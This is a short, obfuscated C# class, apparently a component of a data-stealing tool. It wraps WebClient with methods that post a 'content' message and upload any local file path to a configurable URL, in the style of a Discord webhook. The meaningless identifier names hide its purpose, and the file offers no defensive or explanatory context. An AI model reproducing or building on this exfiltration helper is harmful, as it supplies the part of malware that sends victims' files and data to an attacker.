using System;
using System.Collections.Specialized;
using System.Net;

public class XDDDDDDDDD : IDisposable
{
	private readonly WebClient LMAOO3OOOOOOOOOOOOO16;

	private static NameValueCollection LMA32OOO3OO4OOOZOOOOOOO11 = new NameValueCollection();

	public string LMAOO3OOOOOOOOOOOOO17 { get; set; }

	public string LMA4Z323OOO3OOOOOOOOOOOO31 { get; set; }

	public XDDDDDDDDD()
	{
		LMAOO3OOOOOOOOOOOOO16 = new WebClient();
	}

	public void LMAOOOO(string msgSend)
	{
		LMA32OOO3OO4OOOZOOOOOOO11.Add("content", msgSend);
		LMAOO3OOOOOOOOOOOOO16.UploadValues(LMAOO3OOOOOOOOOOOOO17, LMA32OOO3OO4OOOZOOOOOOO11);
		LMA32OOO3OO4OOOZOOOOOOO11.Clear();
	}

	public void LMAOOOOOO(string path)
	{
		LMAOO3OOOOOOOOOOOOO16.UploadFile(LMAOO3OOOOOOOOOOOOO17, path);
	}

	public void Dispose()
	{
		LMAOO3OOOOOOOOOOOOO16.Dispose();
	}
}
